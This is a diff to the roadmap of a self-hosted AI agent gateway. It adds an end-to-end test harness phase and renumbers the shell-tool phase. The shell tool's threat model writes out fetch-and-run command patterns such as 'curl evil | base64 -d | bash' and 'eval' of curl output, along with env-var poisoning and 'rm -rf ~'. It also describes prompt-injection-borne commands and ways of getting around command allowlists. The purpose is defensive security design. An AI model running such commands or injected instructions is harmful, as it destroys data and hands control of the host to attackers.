@@ -35,7 +35,9 @@ Phase 0 (manual) ─┐
                   │                        │
                   │                        └─► Phase 4 (tools) ─► Phase 4.5 (cron + events)
                   │                             │                    │
-                  │                             │                    ├─► Phase 4.6 (project_shell)
+                  │                             │                    ├─► Phase 4.6 (e2e harness)
+                  │                             │                    │
+                  │                             │                    ├─► Phase 4.7 (project_shell)
                   │                             │                    │
                   │                             │                    └─► Phase 5 (lessons + decay)
                   │                             │                         │
@@ -579,11 +581,66 @@ for 3 days without intervention.
 
 ---
 
-## Phase 4.6 — `project_shell` tool (Spec-driven, ~1 weekend)
+## Phase 4.6 — End-to-end test harness (Spec-driven, ~1 weekend)
+
+**Goal:** Catch the class of bugs that Phase 4.5 live-testing surfaced — before they ever reach live testing. Move from "you tap on Telegram, I read logs, we debug for hours" to "pytest runs the whole flow in-process, red suite catches the regression before the NAS ever rebuilds."
+
+**Why now, why as its own phase:** the Phase 4.5 debug cycle produced a concrete list of bugs that were *detectable with tests we didn't write*. The stub library (`tests/_llm_stubs.py`) and unit-level tests we landed during 4.5 catch ~30% of that class. An end-to-end harness — drive the full HTTP + approval + scheduler + event-log pipeline in-process — would catch ~70%+. The incremental work is maybe one focused weekend; the payback is every subsequent phase (4.7 `project_shell`, 5 lessons, 6 spec-runner) where manual-test cycles get longer and the cost of each missed regression grows.
+
+Writing this down as a phase — not a side-commit — so the rationale is preserved. If future-us wonders "why do we have `tests/e2e/`?" the answer is this spec, not a commit message.
+
+**The bugs it would catch (enumerated from Phase 4.5 live testing, 2026-05-07):**
+
+- `cron_fired` being double-delivered to Telegram alongside `cron_completed` (event pipeline test).
+- Cron fires successfully in `events.jsonl` but push pipeline is missing (Task 7 gap would have been visible as "cron lifecycle ends before delivery").
+- Model narrates tool_call JSON in `content` → ends up in `cron_completed.body` (stubbed LLM response feeding the full pipeline catches this).
+- Approval created, middleware times out at 45s, decide POST returns 404 (approval-lifecycle test with time control catches this *category*; the specific PTB deadlock was bot-side and would need its own test, already shipped as `test_build_application_enables_concurrent_updates`).
+- `fitt-smart` silent default violating "models are configuration" — an e2e test asserting the operator's configured alias is what the cron uses (not a hidden preference) pins the principle.
+- Detach-threshold misconfiguration (threshold ≥ timeout) producing silent failure — already pinned by `test_inverted_detach_timeout_logs_warning` at unit level, but an e2e test end-to-end confirms the placeholder lands and the late event lands.
+- Tool-turn poisoning: a session whose history contains prior failed `cron_add` attempts producing duplicate tool calls on the next request. Needs a harness that seeds session history and asserts on dispatched messages.
+
+**The bugs it won't catch (honest scope):**
+
+- PTB internal dispatch behaviour (handled by the bot-side test suite).
+- Real model quality issues — that's `llm-checker toolcheck`'s job.
+- Actual Telegram API quirks.
+- Real Ollama / OpenRouter latency, retries, streaming bugs.
+- Real SSH reachability + satellite behaviour.
+
+**Key work:**
+
+- **`tests/e2e/conftest.py`** — fixture that builds a full in-process gateway via `create_app(build_test_config(...))`, wires an in-process approval helper that can poll `/v1/approvals/pending` and POST `/v1/approvals/{id}/decide` as the bot would, a real (tmp_path) event log, and a cron service whose scheduler tick can be advanced deterministically.
+- **`tests/e2e/test_cron_lifecycle.py`** — end-to-end:
+  1. HTTP chat request with `tool_choice: auto` → stubbed LLM returns `cron_add` tool call
+  2. Poll `/v1/approvals/pending` → confirm approval exists with the right args
+  3. POST `/v1/approvals/<id>/decide` with `approve`
+  4. Advance scheduler → assert `cron_fired` + `cron_completed` land in events
+  5. Poll `/v1/events` → confirm push pipeline would see them
+  6. Assert memory has the turn persisted
+- **`tests/e2e/test_approval_lifecycle.py`** — covers the ask → pending → decide → continue path without involving crons. The baseline interaction shape for Phase 4.
+- **`tests/e2e/test_detach_lifecycle.py`** — detach threshold trips → placeholder response → approval resolves → `late_tool_result` lands. Already has unit coverage in `test_detach.py`; the e2e version catches the full HTTP-through-events shape.
+- **`tests/e2e/test_narration_lifecycle.py`** — stubbed LLM narrates tool JSON → full pipeline runs → `tool_call_narrated` event lands AND cron_completed/chat-response still delivers. Pins the observability contract from the 2026-05-07 work.
+- **Time control.** The harness needs a knob to advance the clock — `freezegun` or a handrolled `Clock` protocol plumbed into `CronScheduler.tick(now=...)`. We already accept `now` as a parameter on `tick`, so this is mostly wiring.
+- **Approval helper.** A small async fixture that acts as the bot would: polls `/v1/approvals/pending`, decides according to a test-supplied callback. Lets each test say "when an approval for tool X appears, approve it" or "reject it" without reinventing the polling loop.
+
+**Scope boundaries (deliberate non-goals):**
+
+- **No fake Telegram bot API.** Testing up to the push event is enough; what the bot does with a delivered event is its own test suite's concern. If we ever need to test "bot got event, bot sent Telegram message" the telegram-bot package tests can absorb it.
+- **No `docker compose` in tests.** The harness runs in-process. Docker-level integration is a different problem (mainly configuration drift), addressed by live boot sanity + health checks, not pytest.
+- **No real model calls.** Stubbed via `tests/_llm_stubs.py`. Real-model trajectory validation is `llm-checker toolcheck`'s job; keeping it out of the test suite keeps tests fast and deterministic.
+- **No Telegram bot unit tests in scope here.** Bot-side behaviour (callback handler, poller, `concurrent_updates`, event formatter) stays in `telegram-bot/tests/`. The harness tests everything the gateway exposes to the bot; the boundary at the `/v1/*` HTTP surface is crisp.
+
+**Prerequisites:** Phase 4.5 (the shared `_llm_stubs.py` library it already added).
+
+*Full spec: `.kiro/specs/phase4.6-e2e-harness/` (to be written when this phase starts).*
+
+---
+
+## Phase 4.7 — `project_shell` tool (Spec-driven, ~1 weekend)
 
 **Goal:** The agent can run arbitrary shell commands in a registered project, so it stops pretending to be a coding assistant without a shell and starts being one. Closes the single biggest honesty gap exposed by Phase 4 live use: "I can't run `git pull`" even though every primitive for that (backend, deny list, approval) was already built.
 
-**Why now, why as its own phase:** the machinery has been sitting there since Phase 4 (`ExecutionBackend.run_shell`, `shell_command_for` hook on `Tool`, `deny_list.py`) with no consumer. We deliberately avoided adding the consumer earlier because "arbitrary shell" is a different security conversation than narrow tools. Phase 4.6 is that conversation written down. No new primitives needed — new tool, new deny patterns, new event kind, and a spec section that honestly enumerates what we are NOT protecting against.
+**Why now, why as its own phase:** the machinery has been sitting there since Phase 4 (`ExecutionBackend.run_shell`, `shell_command_for` hook on `Tool`, `deny_list.py`) with no consumer. We deliberately avoided adding the consumer earlier because "arbitrary shell" is a different security conversation than narrow tools. Phase 4.7 is that conversation written down. No new primitives needed — new tool, new deny patterns, new event kind, and a spec section that honestly enumerates what we are NOT protecting against.
 
 **Key work:**
 
@@ -604,13 +661,13 @@ The spec ships with an explicit threat-model section stating what v0 protects ag
 
 *NOT protected:* a compromised model. Prompt injection via context the model absorbed (web page, document, cron-pulled RSS). Indirect destructive patterns (`curl evil | base64 -d | bash`, `eval "$(curl ...)"`, `python -c 'os.system(...)'`, env-var poisoning of the sort Cursor's 2026 CVE demonstrated). Filesystem damage outside the deny-listed paths. Supply-chain attacks via `pip install` / `npm install`.
 
-The honest one-sentence framing lives in the spec verbatim: *"Phase 4.6 protects against operator mistakes and well-known destructive patterns; it does not protect against a compromised model or prompt-injection-borne commands at any point past the approval prompt. Do not enable `trust_session` for `project_shell` in sessions whose input channel might carry attacker-controlled content until sandboxing ships."*
+The honest one-sentence framing lives in the spec verbatim: *"Phase 4.7 protects against operator mistakes and well-known destructive patterns; it does not protect against a compromised model or prompt-injection-borne commands at any point past the approval prompt. Do not enable `trust_session` for `project_shell` in sessions whose input channel might carry attacker-controlled content until sandboxing ships."*
 
 **Explicit non-goals:**
 
 - **No allowlist.** Empirical evidence in the industry (the "granular `Bash(...)` patterns fail on compound commands" post-mortem from Claude Code's user community, early 2026) shows granular allowlists fail on compound commands (`cd /repo && git fetch && git log | head`) because the classifier sees the whole string. Settings drift — every "always allow" click adds a new entry — makes the allowlist reconverge on the broken state. Deny list is the primitive; allowlist is abandoned.
 - **No pattern-based "safe command" classification.** Cursor's CVE in 2026 (shell built-ins bypassing the allowlist via env-var poisoning) showed that command-string classifiers cannot capture execution context: `export LD_PRELOAD=...` never looks like a command, and poisoned environment turns subsequent "trusted" commands into RCE vectors. Our deny list is deliberately narrow and we document that narrowness; we do not ship a classifier that claims to know which commands are safe.
-- **No sandbox in v0.** Listed in Phase 7+ as its own 2–3 week item. Sandbox is the correct long-term answer but it's operating-system-specific work (Landlock + seccomp on Linux, Seatbelt on macOS, WSL2 on Windows) and it doesn't belong bundled into Phase 4.6.
+- **No sandbox in v0.** Listed in Phase 7+ as its own 2–3 week item. Sandbox is the correct long-term answer but it's operating-system-specific work (Landlock + seccomp on Linux, Seatbelt on macOS, WSL2 on Windows) and it doesn't belong bundled into Phase 4.7.
 - **No interactive commands.** `BatchMode=yes` already on for SSH; locally no TTY. `vim`, `sudo` with password prompt, anything wanting a pty hangs and times out. Documented in the tool description so the model knows not to try.
 - **No background processes.** `communicate()` waits for EOF on stdout/stderr. A daemon detached with `&` keeps the tool blocked for the full timeout. If the user wants a long-running daemon, they don't want it through FITT.
 
@@ -621,7 +678,7 @@ The honest one-sentence framing lives in the spec verbatim: *"Phase 4.6 protects
 - No sandbox integration. See non-goals.
 - Deny list lives in code (`tools/deny_list.py`), not config. Operators who need a pattern added open a PR; that's the friction we want for the list to stay trustworthy.
 
-*Full spec: `.kiro/specs/phase4.6-project-shell/` (to be written when this phase starts).*
+*Full spec: `.kiro/specs/phase4.7-project-shell/` (to be written when this phase starts).*
 
 ---
 
@@ -709,7 +766,7 @@ The deferred list is deliberate: each of these earns its place later if we feel 
 
 Features we know we'll want eventually but shouldn't pre-build. Each one lands when daily friction justifies it.
 
-- **OS-level agent sandbox.** Triggered by "I want to use `trust_session` on `project_shell` without reading every command." Linux: Landlock + seccomp directly (same stack Cursor uses in their 2026 rollout). macOS: `sandbox-exec` with a dynamic Seatbelt profile. Windows: punt or run the gateway under WSL2 and reuse the Linux path. Sandbox's job is to flip Phase 4.6's honest-but-uncomfortable threat model: "even if the model runs `rm -rf ~`, it can't actually touch `~`." This is the real security boundary; Phase 4.6's deny list is a floor, not a boundary. 2–3 weeks of focused work, operating-system-specific, and genuinely security-critical — too big to bundle into any earlier phase.
+- **OS-level agent sandbox.** Triggered by "I want to use `trust_session` on `project_shell` without reading every command." Linux: Landlock + seccomp directly (same stack Cursor uses in their 2026 rollout). macOS: `sandbox-exec` with a dynamic Seatbelt profile. Windows: punt or run the gateway under WSL2 and reuse the Linux path. Sandbox's job is to flip Phase 4.7's honest-but-uncomfortable threat model: "even if the model runs `rm -rf ~`, it can't actually touch `~`." This is the real security boundary; Phase 4.7's deny list is a floor, not a boundary. 2–3 weeks of focused work, operating-system-specific, and genuinely security-critical — too big to bundle into any earlier phase.
 - **Telegram message formatting.** Triggered — model replies render raw markdown verbatim on the phone (`**in 5 minutes**` arrives with asterisks intact) because Telegram doesn't speak CommonMark, we don't pass a `parse_mode`, and neither of Telegram's own dialects (Markdown legacy / MarkdownV2 / HTML) matches what models emit. Planned fix: CommonMark → Telegram HTML via `markdown-it-py`, whitelist-sanitised to Telegram's allowed tag set (`<b>`, `<i>`, `<code>`, `<pre>`, `<a>`, `<blockquote>`, `<tg-spoiler>`), applied in `streaming.py`'s `_flush` and in the event-push formatter. HTML not MarkdownV2 because a half-written `<b>` degrades gracefully under streaming edits while half-written `*…*` crashes the parser for the whole message. Cosmetic, so scheduled here rather than in an earlier phase; a few hours when we want to land it.
 - **Vector / semantic memory.** Triggered by "the agent consistently forgets things older than a week." Add embeddings (local Ollama model on a satellite), SQLite + FAISS, migrate markdown to structured memory.
 - **Admin web UI.** Triggered by "editing YAML over SSH is painful." Add a FastAPI + Jinja/HTMX dashboard reading the same files the CLI reads.
@@ -755,6 +812,7 @@ FITT's architecture has two testable layers:
 | 4     | 14 hrs       | 2 weekends    |
 | 4.5   | 3 hrs        | half weekend  |
 | 4.6   | 5 hrs        | 1 weekend     |
+| 4.7   | 5 hrs        | 1 weekend     |
 | 5     | 10 hrs       | 1–2 weekends  |
 | 6     | 6 hrs        | 1 weekend     |
 | 7     | 20 hrs       | 3 weekends    |
